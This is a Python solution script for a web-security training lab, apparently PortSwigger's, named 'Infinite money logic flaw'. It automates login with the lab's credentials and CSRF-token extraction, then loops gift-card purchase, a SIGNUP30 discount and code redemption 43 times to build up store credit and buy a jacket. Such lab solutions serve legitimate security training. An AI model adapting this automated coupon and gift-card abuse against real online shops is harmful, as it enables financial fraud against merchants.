#######################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 28/10/2023
#
# Lab: Infinite money logic flaw
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Fetch wiener's profile
#        5. Extract the csrf token needed for subsequent requests
#        6. Add 10 gift cards to the cart
#        7. Apply the coupon SIGNUP30
#        8. Place order
#        9. Fetch the email client
#       10. Collect the received gift card codes
#       11. Redeem the codes one by one
#       12. Repeat the stpes from 6 to 11 multiple times (42 is enough to get the 
#           price of the leather jacket)
#       13. Add the leather jacket the cart
#       14. Plac order
#       15. Confirm order
#
#######################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


#######################################################
# Function to collect all gift card codes in a list
#######################################################
def collect_codes(res):
    # the list that will hold codes
    last_ten_codes = []

    # find all codes in the email client
    codes = re.findall("Your gift card code is:\s*(.*)\s*Thanks,", res.text)
    
    # apppend only the last new 10 codes
    for x in range(0,10):
        last_ten_codes.append(codes[x])
    
    return last_ten_codes


###########
# Main
###########

# change this to your lab URL
url = "https://0a50000604b4844c8130c1b000d30028.web-security-academy.net"

# change this to your exploit domain
exploit_domain = "exploit-0a7d0015047484bd8154c0bc018700a7.exploit-server.net"

try:  
    # fetch the login page
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener's profile
    wiener = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener's profile.. " + Fore.GREEN + "OK")

# extract the csrf token needed for subsequent requests
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

print(Fore.WHITE + "⦗5⦘ Extracting the csrf token needed for subsequent requests.. " + Fore.GREEN + "OK")

# after 43 times you will have the price of the leather jacket and a little more
for counter in range(1,44):
    # data to send via POST
    data = {
        "productId": "2",
        "redir": "PRODUCT",
        "quantity": "10",
    }

    try:  
        # add 10 gift cards to the cart
        requests.post(f"{url}/cart", data, cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to add 10 gift cards to the cart through exception")
        exit(1)

    print(Fore.WHITE + f"⦗6⦘ Adding 10 gift cards to the cart ({counter}/43).. " + Fore.GREEN + "OK")

    # data to send via POST
    data = {
        "csrf": csrf,
        "coupon": "SIGNUP30"
    }

    try:  
        # apply coupon
        requests.post(f"{url}/cart/coupon", data, cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to apply coupon through exception")
        exit(1)

    print(Fore.WHITE + "⦗7⦘ Applying the coupon " + Fore.YELLOW + "SIGNUP30" + Fore.WHITE + ".. " + Fore.GREEN + "OK")

    # data to send via POST
    data = {
        "csrf": csrf,
    }

    try:  
        # place order
        requests.post(f"{url}/cart/checkout", data, cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to place order through exception")
        exit(1)

    print(Fore.WHITE + "⦗8⦘ Placing order.. " + Fore.GREEN + "OK")

    try:  
        # fetch the email client
        email_client = requests.get(f"https://{exploit_domain}/email")
        
    except:
        print(Fore.RED + "[!] Failed to fetch the email client through exception")
        exit(1)

    print(Fore.WHITE + "⦗9⦘ Fetching the email client.. " + Fore.GREEN + "OK")

    # get the last new 10 codes
    codes = collect_codes(email_client)

    print(Fore.WHITE + "⦗10⦘ Collecting the received gift card codes.. " + Fore.GREEN + "OK")

    for (index, code) in enumerate(codes):
        # data to send via POST
        data = {
            "csrf": csrf,
            "gift-card": code
        }

        try:  
            # redeem the code
            requests.post(f"{url}/gift-card", data, cookies=cookies)
            
        except:
            print(Fore.RED + "[!] Failed to redeem the code through exception")

        print(Fore.WHITE + "⦗11⦘ Redeeming the code " + Fore.YELLOW + code + Fore.WHITE + f" ({(index + 1)}/10).. ", end="\r", flush=True)

        # print only after the last request
        if index == 9:
            print(Fore.WHITE + "⦗11⦘ Redeeming the code " + Fore.YELLOW + code + Fore.WHITE + f" ({index + 1}/10).. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "productId": "1",
    "redir": "PRODUCT",
    "quantity": "1",
}

try:  
    # add the leather jacket cards to the cart
    requests.post(f"{url}/cart", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to add the leather jacket cards to the cart through exception")
    exit(1)

print(Fore.WHITE + "⦗12⦘ Adding the leather jacket cards to the cart.. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "csrf": csrf,
}

try:  
    # place order
    requests.post(f"{url}/cart/checkout", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to place order through exception")
    exit(1)

print(Fore.WHITE + "⦗13⦘ Placing order.. " + Fore.GREEN + "OK")

try:  
    # confirm order to mark the lab as solved.
    # without this request the leather jacket will be purchased
    # and your credit will be decreased but the lab will sill be unsolved
    requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to confirm order through exception")
    exit(1)

print(Fore.WHITE + "⦗14⦘ Confirming order.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


